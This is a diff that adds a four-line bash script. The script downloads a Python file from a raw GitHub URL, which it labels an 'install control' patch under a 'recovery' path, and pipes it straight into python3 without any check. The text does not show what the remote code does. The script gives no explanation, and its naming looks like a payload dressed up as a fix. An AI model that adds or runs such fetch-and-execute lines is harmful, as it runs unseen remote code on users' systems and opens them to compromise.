@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+set -euo pipefail
+U=https://raw.githubusercontent.com/andreyshabaev/Browser-Studio/7ec5c088b4acfd00ae9d54fda20152d8e6cc3877/recovery/install_control_v5536_patch.py
+curl -fsSL "$U" | /usr/bin/python3 -
